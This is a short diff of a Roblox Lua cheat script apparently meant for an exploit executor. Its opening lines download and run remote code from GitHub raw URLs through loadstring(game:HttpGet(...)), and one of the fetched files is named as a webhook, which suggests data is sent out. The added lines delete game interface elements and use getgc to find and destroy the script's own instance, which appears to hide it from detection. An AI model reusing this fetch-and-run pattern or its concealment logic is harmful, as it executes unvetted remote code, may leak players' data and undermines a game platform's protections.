@@ -1,8 +1,28 @@
 loadstring(game:HttpGet("https://raw.githubusercontent.com/ccistao/Ditmemay/main/Webhookccbamay"))()
-task.wait(0.05)
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/ccistao/Ditmemay/main/Thongbao"))()
 task.wait(0.05)
+
+local plr = game:GetService("Players").LocalPlayer
+if plr:FindFirstChild("PlayerGui") then
+    for _, guiName in ipairs({"BeastCooldownUI","BeastBanner","IntroGui"}) do
+        local g = plr.PlayerGui:FindFirstChild(guiName)
+        if g then g:Destroy() end
+    end
+end
+
+if getgc then
+    for _, obj in ipairs(getgc()) do
+        if typeof(obj) == "function" then
+            local env = getfenv(obj)
+            if env and env.script and env.script.Name == script.Name then
+                pcall(function()
+                    env.script:Destroy()
+                end)
+            end
+        end
+    end
+end
 
 local Players = game:GetService("Players")
 repeat task.wait() until Players.LocalPlayer
